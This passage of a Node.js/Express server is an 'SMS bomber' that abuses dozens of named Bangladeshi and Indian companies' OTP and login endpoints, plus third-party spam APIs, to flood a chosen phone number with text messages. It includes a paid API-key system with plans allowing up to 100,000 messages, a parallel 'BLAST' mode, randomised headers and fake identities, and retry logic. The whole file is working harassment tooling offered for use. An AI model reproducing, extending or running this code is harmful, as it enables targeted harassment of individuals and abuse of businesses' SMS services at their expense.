  { id: 34, name: "UpaySystem", method: "POST", url: "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/", body: { device_uuid: "abc", firebase_token: "xyz", geo_location: "0,0", mno: "Grameenphone", wallet_number: "{phone}" } },
  { id: 35, name: "Chorki Web", method: "POST", url: "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en", body: { number: "+880{phone}" } },
  { id: 36, name: "Arogga Web", method: "POST", url: "https://api.arogga.com/auth/v1/sms/send?f=mweb&b=Chrome&v=148&os=Android&osv=12", isFormData: true, body: { mobile: "{phone}", fcmToken: "", referral: "" } },
  { id: 37, name: "Pkluck2", method: "POST", url: "https://www.pkluck2.com/wps/verification/sms/noLogin", body: { mobileNum: "{phone}", countryDialingCode: "880" } },
  { id: 38, name: "AppLink V2", method: "POST", url: "https://applink.com.bd/appstore-v4-server/login/otp/request", body: { msisdn: "880{phone}" } },
  { id: 39, name: "Care-Box", method: "POST", url: "https://newprod.api-care-box.click:444/api/user/register/?version=otp", body: { Name: "Abdullah", Phone: "+880{phone}" } },
  { id: 40, name: "Ghoori", method: "POST", url: "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web", body: { mobile_no: "{phone}" } },
  { id: 41, name: "Jayabaji", method: "POST", url: "https://www.jayabajibd.life/api/register/confirm", body: { mobileno: "{phone}", username: "user864", new_password: "tPNVOcen!6XEz3b", confirm_new_password: "tPNVOcen!6XEz3b", country_code: "880", country: "BD", currency: "BDT", language: "en" } },
  { id: 42, name: "Swap.com.bd", method: "POST", url: "https://api.swap.com.bd/api/v1/send-otp/v2", body: { phone: "{phone}" } },
  { id: 43, name: "BdTickets V1", method: "POST", url: "https://apiv1.bdtickets.com/api/v1/auth/otp/send", body: { phone: "+880{phone}" } },
  { id: 44, name: "Binge POST", method: "POST", url: "https://ss.binge.buzz/otp/send/login", body: { mobile: "{phone}" } },
  { id: 45, name: "SendMySMS", method: "POST", url: "https://sendmysms.net/send-otp.php", isFormData: true, body: { phonenumber: "{phone}" } },
  { id: 46, name: "Shikho #2", method: "POST", url: "https://api.shikho.com/auth/v2/send/sms", body: { auth_type: "login", phone: "{phone}", vendor: "shikho", type: "student" } },
  { id: 47, name: "Eonbazar", method: "POST", url: "https://app.eonbazar.com/api/auth/login", body: { method: "otp", mobile: "{phone}" } },
  { id: 48, name: "NESCO", method: "POST", url: "http://nesco.sslwireless.com/api/v1/login", body: { phone_number: "{phone}" } },
  { id: 49, name: "Quizgiri", method: "POST", url: "https://developer.quizgiri.xyz/api/v2.0/send-otp", body: { country_code: "+880", phone: "{phone}" } },
  { id: 50, name: "Bazar365", method: "POST", url: "https://www.bazar365.store/api/v1/auth/sendPhoneOtp", body: { phone: "{phone}", applicationChannel: "WEB_APP" } },
  { id: 51, name: "Bioscope Web", method: "POST", url: "https://www.bioscopelive.com/en/login/send-otp?phone=880{phone}&operator=bd-otp", body: { phone: "{phone}", applicationChannel: "WEB_APP" } },
  { id: 52, name: "ShadowX API", method: "GET", url: "https://shadowx-api.onrender.com/api/bm?num={phone}&count={count}", isShadowX: true }
];

// ============================================================
// INDIAN APIS
// ============================================================
const INDIAN_APIS = [
  { id: 53, name: "BeepKart", method: "POST", url: "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp", body: { phone: "{phone}", city: 362 } },
  { id: 54, name: "Smytten", method: "POST", url: "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", body: { phone: "{phone}", email: "test@example.com" } },
  { id: 55, name: "MyHubble", method: "POST", url: "https://api.myhubble.money/v1/auth/otp/generate", body: { phoneNumber: "{phone}", channel: "SMS" } },
  { id: 56, name: "Housing.com", method: "POST", url: "https://login.housing.com/api/v2/send-otp", body: { phone: "{phone}", country_url_name: "in" } },
  { id: 57, name: "RentoMojo", method: "POST", url: "https://www.rentomojo.com/api/RMUsers/isNumberRegistered", body: { phone: "{phone}" } },
  { id: 58, name: "Khatabook", method: "POST", url: "https://api.khatabook.com/v1/auth/request-otp", body: { phone: "{phone}", app_signature: "wk+avHrHZf2" } },
  { id: 59, name: "Animall", method: "POST", url: "https://animall.in/zap/auth/login", body: { phone: "{phone}", signupPlatform: "NATIVE_ANDROID" } },
  { id: 60, name: "Cosmofeed", method: "POST", url: "https://prod.api.cosmofeed.com/api/user/authenticate", body: { phone: "{phone}", version: "1.4.28" } },
  { id: 61, name: "Spencers", method: "POST", url: "https://jiffy.spencers.in/user/auth/otp/send", body: { mobile: "{phone}" } },
  { id: 62, name: "Wakefit", method: "POST", url: "https://api.wakefit.co/api/consumer-sms-otp/", body: { mobile: "{phone}" } },
  { id: 63, name: "Hungama", method: "POST", url: "https://communication.api.hungama.com/v1/communication/otp", body: { mobileNo: "{phone}", countryCode: "+91", appCode: "un", messageId: "1", device: "web" } },
  { id: 64, name: "Doubtnut", method: "POST", url: "https://api.doubtnut.com/v4/student/login", body: { phone_number: "{phone}", language: "en" } },
  { id: 65, name: "PenPencil", method: "POST", url: "https://api.penpencil.co/v1/users/resend-otp?smsType=1", body: { organizationId: "5eb393ee95fab7468a79d189", mobile: "{phone}" } },
  { id: 66, name: "APU Inky", method: "GET", url: "https://apu-inky.vercel.app/send?number={phone}" }
];

// ============================================================
// SHADOWX / LMNx9 FILLERS
// ============================================================
const GX_APIS = [];
for (let i = 1; i <= 50; i++) {
  GX_APIS.push({
    id: 150 + i, name: `ShadowX ${i}`, method: "GET",
    url: `https://shadowx-api.onrender.com/api/bm?num={phone}&count={count}`,
    isShadowX: true
  });
}
const LMNX9_APIS = [];
for (let i = 1; i <= 50; i++) {
  LMNX9_APIS.push({
    id: 200 + i, name: `LMNx9 API${i}`, method: "GET",
    url: `https://lmnx9-sms-spam-v11.onrender.com/api${i}?number={phone}`,
    isLMNx9: true
  });
}

// ============================================================
// COMBINE + DEDUPE
// ============================================================
function dedupeApis(list) {
  const seen = new Set();
  const out = [];
  for (const api of list) {
    const key = `${api.method}::${api.url}`;
    if (seen.has(key)) continue;
    seen.add(key);
    out.push(api);
  }
  return out;
}
const RAW_COMBINED = [
  ...PHP_CONVERTED_APIS,
  ...NEW_APIS_V71,
  ...ORIGINAL_APIS,
  ...INDIAN_APIS,
  ...GX_APIS,
  ...LMNX9_APIS,
  ...MEGA_APIS
];
const SMS_APIS = dedupeApis(RAW_COMBINED);
console.log(`📡 Total APIs loaded: ${SMS_APIS.length} (raw ${RAW_COMBINED.length}, deduped ${RAW_COMBINED.length - SMS_APIS.length})`);

// ============================================================
// PLAN CONFIG
// ============================================================
const PLAN_CONFIG = {
  default: { name: 'Default', maxCount: 300, requiresKey: false },
  free: { name: 'Free', maxCount: 50, requiresKey: false },
  premium: { name: 'Premium', maxCount: 10000, requiresKey: true },
  enterprise: { name: 'Enterprise', maxCount: 50000, requiresKey: true },
  unlimited: { name: 'Unlimited', maxCount: 100000, requiresKey: true }
};

// ============================================================
// KEY MANAGER
// ============================================================
class KeyManager {
  constructor() {
    this.keysFile = path.join(__dirname, 'keys.json');
    this.validKeys = this.loadKeys();
  }
  loadKeys() {
    try {
      if (fs.existsSync(this.keysFile)) {
        const data = JSON.parse(fs.readFileSync(this.keysFile, 'utf8'));
        const m = new Map();
        Object.entries(data).forEach(([k, v]) => {
          m.set(k, { expiry: new Date(v.expiry), plan: v.plan, usageCount: v.usageCount || 0 });
        });
        return m;
      }
    } catch (e) { console.error('Key load err:', e.message); }
    return new Map();
  }
  saveKeys() {
    const obj = {};
    for (const [k, v] of this.validKeys.entries()) {
      obj[k] = { expiry: v.expiry.toISOString(), plan: v.plan, usageCount: v.usageCount || 0 };
    }
    fs.writeFileSync(this.keysFile, JSON.stringify(obj, null, 2));
  }
  generateKey(plan = 'premium', days = 30) {
    const key = Utility.generateApiKey();
    const expiry = new Date();
    expiry.setDate(expiry.getDate() + days);
    this.validKeys.set(key, { expiry, plan, usageCount: 0 });
    this.saveKeys();
    return { apiKey: key, expiryDate: expiry, plan };
  }
  validateKey(key) {
    if (!this.validKeys.has(key)) return false;
    return new Date() < this.validKeys.get(key).expiry;
  }
  getKeyInfo(key) {
    if (!this.validKeys.has(key)) return null;
    const k = this.validKeys.get(key);
    return {
      key, plan: k.plan, expires: k.expiry.toISOString(),
      valid: new Date() < k.expiry,
      daysLeft: Math.max(0, Math.ceil((k.expiry - new Date()) / 86400000)),
      usageCount: k.usageCount
    };
  }
  useKey(key) {
    const k = this.validKeys.get(key);
    if (!k) return false;
    k.usageCount = (k.usageCount || 0) + 1;
    this.saveKeys();
    return true;
  }
  getAllKeys() {
    const out = [];
    for (const [k, v] of this.validKeys.entries()) {
      out.push({ key: k, plan: v.plan, expires: v.expiry.toISOString(), valid: new Date() < v.expiry, usageCount: v.usageCount || 0 });
    }
    return out;
  }
}

// ============================================================
// RATE LIMITER (disabled by default in this build)
// ============================================================
class RateLimiter {
  constructor() { this.requests = new Map(); }
  checkLimit(identifier) {
    if (!CONFIG.security.rateLimit.enabled) return true;
    const now = Date.now();
    const w = CONFIG.security.rateLimit.windowMs;
    const max = CONFIG.security.rateLimit.maxRequests;
    if (!this.requests.has(identifier)) this.requests.set(identifier, []);
    const arr = this.requests.get(identifier).filter(t => now - t < w);
    arr.push(now);
    this.requests.set(identifier, arr);
    return arr.length <= max;
  }
}

// ============================================================
// EXPRESS
// ============================================================
const app = express();
const bombController = new BombController();
const keyManager = new KeyManager();
const rateLimiter = new RateLimiter();

app.use(helmet({ contentSecurityPolicy: false, crossOriginEmbedderPolicy: false }));
app.use(cors({ origin: '*' }));
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static(path.join(__dirname, '../public')));

app.use((req, res, next) => {
  req.requestId = Utility.generateId();
  res.setHeader('X-Request-ID', req.requestId);
  next();
});

app.use((req, res, next) => {
  const ip = req.ip || req.connection.remoteAddress;
  const apiKey = req.query.key || req.headers['x-api-key'];
  const id = apiKey || ip;
  if (!rateLimiter.checkLimit(id)) {
    return res.status(429).json({ success: false, error: ERROR_MESSAGES.RATE_LIMIT, developer: DEVELOPER_INFO });
  }
  next();
});

// ============================================================
// ENDPOINTS
// ============================================================
app.get('/', (req, res) => {
  const p = path.join(__dirname, '../public/index.html');
  if (fs.existsSync(p)) return res.sendFile(p);
  res.json({ success: true, developer: DEVELOPER_INFO, message: 'SMS Bomber V8.3 BLAST running' });
});

app.get('/api', (req, res) => {
  res.json({
    developer: DEVELOPER_INFO, version: "8.3.0-BLAST", total_apis: SMS_APIS.length,
    plans: Object.keys(PLAN_CONFIG),
    endpoints: {
      spam: '/api/spam?number=01700000000&count=1',
      blast: '/api/spam?number=01700000000&count=1&blast=true',
      stop: '/api/stop?all=true', pause: '/api/pause?all=true', resume: '/api/resume?all=true',
      status: '/api/status', stats: '/api/stats', alllist: '/api/alllist',
      apistats: '/api/api-stats', health: '/api/health'
    }
  });
});

app.get('/api/health', (req, res) => {
  res.json({
    status: 'active', developer: DEVELOPER_INFO, version: "8.3.0-BLAST",
    uptime: process.uptime(), total_apis: SMS_APIS.length,
    active_jobs: bombController.activeJobs.size,
    memory: Utility.getMemoryUsage()
  });
});

// ============================================================
// SPAM — count=1 -> BLAST (all APIs parallel)
//        count>1 -> batched (old behaviour)
// ============================================================
app.get('/api/spam', async (req, res) => {
  const { plan, number, count = 1, key, blast } = req.query;
  let currentPlan = 'default';
  let planConfig = PLAN_CONFIG.default;
  if (plan && PLAN_CONFIG[plan]) { currentPlan = plan; planConfig = PLAN_CONFIG[plan]; }

  if (planConfig.requiresKey) {
    if (!key || !keyManager.validateKey(key)) {
      return res.status(401).json({ success: false, error: ERROR_MESSAGES.INVALID_API_KEY, developer: DEVELOPER_INFO });
    }
    keyManager.useKey(key);
  }

  if (!number) return res.status(400).json({ success: false, error: ERROR_MESSAGES.MISSING_PARAM, param: 'number', developer: DEVELOPER_INFO });

  const cleanNumber = Utility.parsePhone(number);
  if (!Utility.isValidPhone(cleanNumber)) {
    return res.status(400).json({ success: false, error: ERROR_MESSAGES.INVALID_PHONE, example: '017XXXXXXXX', developer: DEVELOPER_INFO });
  }

  let perApiCount = parseInt(count) || 1;
  if (perApiCount < 1) perApiCount = 1;
  if (perApiCount > planConfig.maxCount) {
    return res.status(400).json({ success: false, error: `Max ${planConfig.maxCount} for ${currentPlan}`, developer: DEVELOPER_INFO });
  }

  const totalSMS = SMS_APIS.length * perApiCount;
  const jobId = bombController.registerJob(cleanNumber, totalSMS, { plan: currentPlan, perApiCount });

  const mode = (perApiCount === 1 || blast === 'true') ? 'BLAST' : 'BATCH';
  console.log(`📱 [${currentPlan.toUpperCase()}] [${mode}] JOB ${jobId}: ${perApiCount}x${SMS_APIS.length} = ${totalSMS} to ${Utility.maskPhone(cleanNumber)}`);

  (async () => {
    try {
      if (mode === 'BLAST') {
        await blastAll(SMS_APIS, cleanNumber, perApiCount, jobId, bombController);
      } else {
        await sendBatch(SMS_APIS, cleanNumber, perApiCount, jobId, bombController);
      }
    } catch (e) {
      console.error(`JOB ${jobId} failed:`, e.message);
      bombController.stopJob(jobId);
    }
  })();

  res.json({
    success: true, developer: DEVELOPER_INFO, jobId, plan: currentPlan,
    mode, target: Utility.maskPhone(cleanNumber), per_api_count: perApiCount,
    total_apis: SMS_APIS.length, total_sms: totalSMS, status: 'started',
    stop_endpoint: `/api/stop?jobId=${jobId}`,
    status_endpoint: `/api/status?jobId=${jobId}`, timestamp: Utility.getISOString()
  });
});

app.get('/api/stop', (req, res) => {
  const { jobId, all } = req.query;
  if (all === 'true') {
    const c = bombController.stopAllJobs();
    return res.json({ success: true, stopped_count: c, developer: DEVELOPER_INFO });
  }
  if (jobId) {
    const ok = bombController.stopJob(jobId);
    return res.json({ success: ok, jobId, developer: DEVELOPER_INFO });
  }
  res.status(400).json({ success: false, error: ERROR_MESSAGES.MISSING_PARAM, developer: DEVELOPER_INFO });
});

app.get('/api/pause', (req, res) => {
  const { jobId, all } = req.query;
  if (all === 'true') return res.json({ success: true, paused_count: bombController.pauseAllJobs(), developer: DEVELOPER_INFO });
  if (jobId) return res.json({ success: bombController.pauseJob(jobId), jobId, developer: DEVELOPER_INFO });
  res.status(400).json({ success: false, error: ERROR_MESSAGES.MISSING_PARAM, developer: DEVELOPER_INFO });
});

app.get('/api/resume', (req, res) => {
  const { jobId, all } = req.query;
  if (all === 'true') return res.json({ success: true, resumed_count: bombController.resumeAllJobs(), developer: DEVELOPER_INFO });
  if (jobId) return res.json({ success: bombController.resumeJob(jobId), jobId, developer: DEVELOPER_INFO });
  res.status(400).json({ success: false, error: ERROR_MESSAGES.MISSING_PARAM, developer: DEVELOPER_INFO });
});

app.get('/api/status', (req, res) => {
  const { jobId } = req.query;
  if (jobId) {
    const j = bombController.getJobStatus(jobId);
    if (!j) return res.status(404).json({ success: false, error: ERROR_MESSAGES.JOB_NOT_FOUND, developer: DEVELOPER_INFO });
    return res.json({ success: true, job: j, developer: DEVELOPER_INFO });
  }
  res.json({ success: true, stats: bombController.getStats(), jobs: bombController.getAllJobs(), developer: DEVELOPER_INFO });
});

app.get('/api/stats', (req, res) => {
  const keys = keyManager.getAllKeys();
  res.json({
    success: true, developer: DEVELOPER_INFO,
    bomb_stats: bombController.getStats(),
    keys: { total: keys.length, valid: keys.filter(k => k.valid).length },
    apis: { total: SMS_APIS.length, get: SMS_APIS.filter(a => a.method === 'GET').length, post: SMS_APIS.filter(a => a.method === 'POST').length },
    api_stats: apiStatsTracker.getSummary()
  });
});

app.get('/api/alllist', (req, res) => {
  const statsMap = new Map(apiStatsTracker.getAll().map(s => [s.id, s]));
  const list = SMS_APIS.map(api => {
    const s = statsMap.get(api.id) || { calls: 0, success: 0, failed: 0, lastCall: null, avgResponseTime: 0 };
    return {
      id: api.id, name: api.name, method: api.method,
      url: typeof api.url === 'string' ? api.url : '[dynamic]',
      stats: {
        calls: s.calls, success: s.success, failed: s.failed,
        successRate: s.calls > 0 ? ((s.success / s.calls) * 100).toFixed(2) + '%' : '0%',
        avgResponseTime: s.avgResponseTime + 'ms',
        lastCall: s.lastCall ? new Date(s.lastCall).toISOString() : null
      }
    };
  });
  res.json({
    success: true, developer: DEVELOPER_INFO,
    total_apis: SMS_APIS.length,
    summary: apiStatsTracker.getSummary(),
    apis: list, timestamp: Utility.getISOString()
  });
});

app.get('/api/api-stats', (req, res) => {
  res.json({
    success: true, developer: DEVELOPER_INFO,
    summary: apiStatsTracker.getSummary(),
    per_api: apiStatsTracker.getAll()
  });
});

app.get('/api/expiredate=30&createkey', (req, res) => {
  const { plan = 'premium', days = 30 } = req.query;
  if (!PLAN_CONFIG[plan]) return res.status(400).json({ success: false, error: `Invalid plan: ${plan}`, available: Object.keys(PLAN_CONFIG), developer: DEVELOPER_INFO });
  const r = keyManager.generateKey(plan, parseInt(days) || 30);
  res.json({ success: true, api_key: r.apiKey, plan: r.plan, expiry: r.expiryDate.toISOString(), developer: DEVELOPER_INFO });
});

app.get('/api/checkkey', (req, res) => {
  const { key } = req.query;
  if (!key) return res.status(400).json({ success: false, error: ERROR_MESSAGES.MISSING_PARAM, developer: DEVELOPER_INFO });
  const info = keyManager.getKeyInfo(key);
  if (!info) return res.status(404).json({ success: false, error: 'Invalid key', developer: DEVELOPER_INFO });
  res.json({ success: true, ...info, developer: DEVELOPER_INFO });
});

app.use((req, res) => res.status(404).json({ success: false, error: 'Endpoint not found', path: req.path, developer: DEVELOPER_INFO }));
app.use((err, req, res, next) => {
  console.error('❌', err.stack);
  res.status(500).json({ success: false, error: ERROR_MESSAGES.INTERNAL_ERROR, message: err.message, developer: DEVELOPER_INFO });
});

// ============================================================
// DYNAMIC BODY BUILDER
// ============================================================
function buildDynamicBody(api, phone) {
  const rand = Utility.randomString(10);
  const randName = Utility.randomName();
  const randEmail = randName.toLowerCase() + rand + '@gmail.com';
  const now = new Date().toISOString().slice(0, 19);

  const stringify = (obj) => {
    if (obj === null || obj === undefined) return obj;
    if (Array.isArray(obj)) return obj.map(stringify);
    if (typeof obj === 'object') {
      const out = {};
      for (const [k, v] of Object.entries(obj)) out[k] = stringify(v);
      return out;
    }
    if (typeof obj === 'string') {
      return obj
        .replace(/{phone}/g, phone)
        .replace(/{phone_e164}/g, Utility.normalizeBD(phone))
        .replace(/{phone_10}/g, phone.slice(-10))
        .replace(/{count}/g, 1)
        .replace(/{ts}/g, Date.now())
        .replace(/{name}/g, randName)
        .replace(/{firstName}/g, randName)
        .replace(/{lastName}/g, 'Khan')
        .replace(/{email}/g, randEmail)
        .replace(/{device}/g, crypto.randomUUID())
        .replace(/randomName/g, randName)
        .replace(/randomEmail/g, randEmail)
        .replace(/currentTime/g, Date.now())
        .replace(/now/g, now);
    }
    return obj;
  };
  return stringify(api.body);
}

// ============================================================
// SINGLE API CALL — no retry ladder when BLAST mode
// ============================================================
async function callSingleAPI(api, phone, jobId, attempt = 0) {
  const startTime = Date.now();
  if (!bombController.isJobActive(jobId)) {
    return { success: false, api_id: api.id, api_name: api.name, error: 'Job stopped', stopped: true, responseTime: 0 };
  }

  try {
    const cleanPhone = Utility.parsePhone(phone);
    const headers = getRandomHeaders(api.headers || {});

    let url = typeof api.url === 'function' ? api.url(cleanPhone) : api.url;
    if (typeof url === 'string') {
      url = url
        .replace(/{phone}/g, cleanPhone)
        .replace(/{phone_e164}/g, Utility.normalizeBD(cleanPhone))
        .replace(/{phone_10}/g, cleanPhone.slice(-10))
        .replace(/{count}/g, 1)
        .replace(/{ts}/g, Date.now());
    }

    let agent;
    if (url.startsWith('https://')) {
      agent = api.insecure ? HTTPS_AGENT_INSECURE : HTTPS_AGENT;
    } else {
      agent = HTTP_AGENT;
    }

    const config = {
      method: api.method,
      url,
      headers,
      timeout: api.timeout || CONFIG.performance.timeout,
      validateStatus: () => true,
      httpsAgent: agent,
      httpAgent: agent
    };

    if (api.method === 'POST') {
      const body = buildDynamicBody(api, cleanPhone);
      if (typeof body === 'string') {
        config.data = body;
      } else if (api.isFormData) {
        config.headers['Content-Type'] = 'application/x-www-form-urlencoded';
        config.data = new URLSearchParams(body).toString();
      } else {
        config.data = body;
      }
    }

    const response = await axios(config);
    const responseTime = Date.now() - startTime;
    const isSuccess = response.status >= 200 && response.status < 500;
    apiStatsTracker.record(api.id, api.name, isSuccess, responseTime);
    return {
      success: isSuccess,
      api_id: api.id,
      api_name: api.name,
      status: response.status,
      responseTime
    };
  } catch (error) {
    const responseTime = Date.now() - startTime;
    apiStatsTracker.record(api.id, api.name, false, responseTime, error.message);

    if (attempt < CONFIG.performance.maxRetries && bombController.isJobActive(jobId)) {
      await Utility.sleep(CONFIG.performance.retryDelay * (attempt + 1));
      return callSingleAPI(api, phone, jobId, attempt + 1);
    }
    return {
      success: false, api_id: api.id, api_name: api.name,
      error: error.message, status: error.response?.status || null, responseTime
    };
  }
}

// ============================================================
// BLAST — every API in parallel, fire-and-forget completion
// ============================================================
async function blastAll(apis, phone, countPerApi, jobId, controller) {
  // countPerApi >= 1; total calls = apis.length * countPerApi
  const shuffled = Utility.shuffleArray([...apis]);
  const tasks = [];

  for (const api of shuffled) {
    for (let j = 0; j < countPerApi; j++) {
      if (!controller.isJobActive(jobId)) break;
      tasks.push(
        callSingleAPI(api, phone, jobId).then(r => {
          if (!r.stopped) controller.updateJobStats(jobId, r.success, r.error);
        })
      );
    }
    if (!controller.isJobActive(jobId)) break;
  }

  // All tasks already in flight. Await completion for job bookkeeping.
  const startedAt = Date.now();
  await Promise.allSettled(tasks);
  const elapsed = Date.now() - startedAt;
  console.log(`💥 BLAST job ${jobId}: ${tasks.length} calls in ${elapsed}ms (${(tasks.length / (elapsed / 1000)).toFixed(1)} req/s)`);
  return { fired: tasks.length, elapsed };
}

// ============================================================
// BATCH — old batched mode for count>1 without blast=true
// ============================================================
async function sendBatch(apis, phone, countPerApi, jobId, controller) {
  const actualCount = Math.min(countPerApi, CONFIG.performance.maxCountPerAPI);
  const BATCH_SIZE = CONFIG.performance.parallelRequests;
  const shuffled = Utility.shuffleArray([...apis]);
  let processed = 0;

  for (let i = 0; i < shuffled.length; i += BATCH_SIZE) {
    if (!controller.isJobActive(jobId)) {
      console.log(`⏹️ Job ${jobId} stopped at ${processed}/${shuffled.length}`);
      break;
    }
    const batch = shuffled.slice(i, i + BATCH_SIZE);
    const batchPromises = batch.map(async (api) => {
      const promises = [];
      for (let j = 0; j < actualCount; j++) {
        if (!controller.isJobActive(jobId)) break;
        promises.push(callSingleAPI(api, phone, jobId));
      }
      const responses = await Promise.all(promises);
      responses.forEach(r => {
        if (!r.stopped) controller.updateJobStats(jobId, r.success, r.error);
      });
      return { api_id: api.id, success: responses.filter(r => r.success).length, failed: responses.filter(r => !r.success).length };
    });
    await Promise.all(batchPromises);
    processed += batch.length;
    if (processed % 10 === 0) console.log(`📊 Job ${jobId}: ${processed}/${shuffled.length}`);
    await Utility.sleep(30);
  }
  return { processed };
}

// ============================================================
// START
// ============================================================
const server = app.listen(CONFIG.server.port, CONFIG.server.host, () => {
  console.log(`\n🚀 ULTIMATE SMS BOMBER V8.3-BLAST`);
  console.log(`📡 PID: ${process.pid}`);
  console.log(`🌐 Port: ${CONFIG.server.port}`);
  console.log(`📊 Total APIs: ${SMS_APIS.length}`);
  console.log(`💥 BLAST mode: count=1 fires every API in parallel`);
  console.log(`🔑 Keys loaded: ${keyManager.getAllKeys().length}`);
  console.log(`⚙️  Socket pool: ${CONFIG.performance.maxSockets} keep-alive`);
  console.log(`\n✅ Server ready!\n`);
});
server.timeout = 120000;
server.keepAliveTimeout = 60000;

process.on('SIGTERM', () => {
  bombController.stopAllJobs();
  server.close(() => process.exit(0));
});
process.on('SIGINT', () => {
  bombController.stopAllJobs();
  server.close(() => process.exit(0));
});

module.exports = { app, bombController, keyManager, apiStatsTracker, SMS_APIS };
